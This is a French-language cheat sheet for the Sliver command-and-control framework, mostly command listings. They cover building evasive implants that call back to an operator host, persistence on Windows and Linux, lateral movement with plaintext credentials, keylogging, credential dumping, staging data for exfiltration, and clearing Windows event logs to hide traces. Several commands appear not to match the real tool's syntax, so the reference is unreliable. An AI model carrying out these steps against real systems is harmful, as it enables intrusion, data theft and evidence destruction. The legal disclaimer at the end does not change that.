# Silver C2 - Aide-Mémoire Rapide

## 🚀 Démarrage Rapide

### Installation
```bash
# Installation automatique
curl https://sliver.sh/install | sudo bash

# Ou utiliser le script fourni
chmod +x install-silver-c2.sh
./install-silver-c2.sh
```

### Première utilisation
```bash
# Démarrer le serveur
sudo sliver-server daemon

# Se connecter (nouveau terminal)
sliver-client
```

## 📡 Listeners

### Créer des listeners
```bash
# HTTP
http --lhost 0.0.0.0 --lport 8080

# HTTPS
https --lhost 0.0.0.0 --lport 8443

# DNS
dns --domains example.com --lhost 0.0.0.0 --lport 53

# TCP pivotant
stage-listener --url tcp://0.0.0.0:8888
```

### Gestion des listeners
```bash
listeners              # Lister tous les listeners
listeners -k <ID>      # Arrêter un listener
```

## 🎯 Génération d'Implants

### Implants basiques
```bash
# Windows EXE
generate --http 192.168.1.100:8080 --os windows --arch amd64 --format exe --save /tmp/

# Linux ELF  
generate --http 192.168.1.100:8080 --os linux --arch amd64 --format elf --save /tmp/

# macOS
generate --http 192.168.1.100:8080 --os darwin --arch amd64 --format macho --save /tmp/
```

### Implants avancés
```bash
# Beacon avec jitter
generate beacon --http 192.168.1.100:8080 --jitter 30s --interval 60s --os windows --format exe

# Avec évasion
generate --http 192.168.1.100:8080 --os windows --evasion --format exe

# Shellcode
generate --http 192.168.1.100:8080 --os windows --format shellcode --save /tmp/
```

### Profils réutilisables
```bash
# Créer un profil
profiles new --http 192.168.1.100:8080 --os windows --arch amd64 --format exe my-profile

# Utiliser un profil
profiles generate my-profile --save /tmp/

# Lister les profils
profiles
```

## 🎮 Gestion des Sessions

### Sessions de base
```bash
sessions               # Lister les sessions actives
sessions -i <ID>       # Interagir avec une session
use <session-name>     # Utiliser une session
background             # Mettre en arrière-plan
```

### Informations système
```bash
info                   # Informations de base
whoami                 # Utilisateur actuel
getuid                 # UID/GID
pwd                    # Répertoire courant
getpid                 # PID du processus
```

## 🔍 Reconnaissance

### Système
```bash
ps                     # Processus en cours
ps -T                  # Avec threads
ps -e                  # Tous les processus
netstat                # Connexions réseau
ifconfig               # Interfaces réseau
env                    # Variables d'environnement
```

### Navigation de fichiers
```bash
ls                     # Lister le répertoire
ls /path/to/dir        # Lister un répertoire spécifique  
cd /path               # Changer de répertoire
pwd                    # Répertoire courant
cat /path/to/file      # Afficher un fichier
```

### Recherche
```bash
find /path "*.txt"     # Chercher des fichiers
locate filename        # Localiser un fichier
```

## 📁 Transfert de Fichiers

### Upload/Download
```bash
upload /local/file /remote/path          # Envoyer un fichier
download /remote/file /local/path        # Télécharger un fichier
```

### Exécution
```bash
execute /path/to/file                    # Exécuter un fichier
execute /path/to/file arg1 arg2          # Avec arguments
shell                                    # Shell interactif
```

## 🔓 Élévation de Privilèges

### Techniques automatiques
```bash
getsystem              # Tentative automatique d'élévation
getprivs               # Afficher les privilèges
```

### Injection de processus
```bash
ps                     # Trouver un processus cible
migrate <PID>          # Migrer vers un processus
```

### Dump de credentials
```bash
hashdump               # Dump des hashes SAM
```

## 🔄 Persistance

### Windows
```bash
# Service Windows
persistence service --name "Update" --path "C:\Windows\System32\implant.exe"

# Tâche programmée
persistence task --name "Check" --path "C:\implant.exe" --trigger startup

# Registre
persistence registry --key "HKCU\...\Run" --value "Update" --path "C:\implant.exe"
```

### Linux
```bash
# Cron job
persistence cron --command "/tmp/implant" --schedule "@reboot"

# Service systemd
persistence systemd --name "update" --path "/usr/bin/implant"
```

## 🌐 Mouvement Latéral

### Reconnaissance réseau
```bash
portscan 192.168.1.0/24                 # Scanner un réseau
portscan 192.168.1.10 -p 22,80,443      # Scanner des ports spécifiques
```

### Exécution à distance
```bash
# WMI (Windows)
wmi --hostname target.com --username admin --password pass --payload /path/implant.exe

# PSExec
psexec --hostname target.com --username admin --password pass --payload /path/implant.exe

# SSH (Linux/Unix)
ssh --hostname target.com --username root --password pass --payload /path/implant
```

## 🕵️ Post-Exploitation Avancée

### Keylogger
```bash
keylogger start        # Démarrer le keylogger
keylogger dump         # Récupérer les frappes
keylogger stop         # Arrêter le keylogger
```

### Screenshots
```bash
screenshot             # Prendre une capture d'écran
```

### Exfiltration
```bash
# Recherche de fichiers sensibles
find /home "password*"
find "C:\Users" "*.pdf"

# Compression pour exfiltration
tar czf /tmp/data.tar.gz /path/to/sensitive/data
download /tmp/data.tar.gz /local/path/
```

## 🛠️ Extensions et Modules

### Extensions BOF (Beacon Object Files)
```bash
bof-list               # Lister les BOFs disponibles
bof <bof-name> <args>  # Exécuter un BOF
```

### Modules Python
```bash
python /path/to/script.py              # Exécuter un script Python
```

## 🔧 Configuration et Opérateurs

### Gestion des opérateurs
```bash
operators new --name alice --lhost 192.168.1.100    # Créer un opérateur
operators                                           # Lister les opérateurs
```

### Configuration du serveur
```bash
# Certificats personnalisés
https --lhost 0.0.0.0 --lport 443 --cert /path/cert.pem --key /path/key.pem

# Domaines multiples pour DNS
dns --domains example.com,test.com --lhost 0.0.0.0
```

## 🚨 Nettoyage et Sécurité

### Supprimer les traces
```bash
# Supprimer l'implant
rm /path/to/implant

# Supprimer la persistance
# (dépend du type de persistance utilisé)

# Nettoyer les logs Windows
execute "wevtutil cl Security"
execute "wevtutil cl System"
```

### Bonnes pratiques
```bash
# Utiliser HTTPS avec certificats valides
# Configurer des jitters pour éviter la détection
# Nettoyer après chaque test
# Documenter toutes les actions
```

## 📊 Monitoring et Logs

### Logs du serveur
```bash
# Démarrer avec logs détaillés
sliver-server daemon --log-level debug --log-file /var/log/sliver.log

# Consulter les logs
tail -f /var/log/sliver.log
```

### Logs de session
```bash
logs --session <session-id>            # Logs d'une session spécifique
```

## ⚠️ Conseils de Sécurité

### Évasion
- Utilisez `--evasion` lors de la génération
- Variez les jitters et intervalles de beacon
- Utilisez des certificats SSL valides
- Évitez les patterns prévisibles

### Détection
- Surveillez les connexions réseau sortantes inhabituelles
- Surveillez les processus avec des signatures suspectes
- Utilisez des outils de détection comportementale

### Légal
⚠️ **IMPORTANT**: N'utilisez Silver C2 que dans des contextes légaux :
- Tests d'intrusion autorisés
- Exercices Red Team internes
- Recherche académique
- Environnements de laboratoire

---

## 🔗 Ressources

- **Wiki officiel**: https://github.com/BishopFox/sliver/wiki
- **Discord**: https://discord.gg/bishopfox  
- **Documentation**: https://sliver.sh/docs/
- **Exemples**: https://github.com/BishopFox/sliver/tree/master/examples

---

*Aide-mémoire généré pour le projet Silver C2*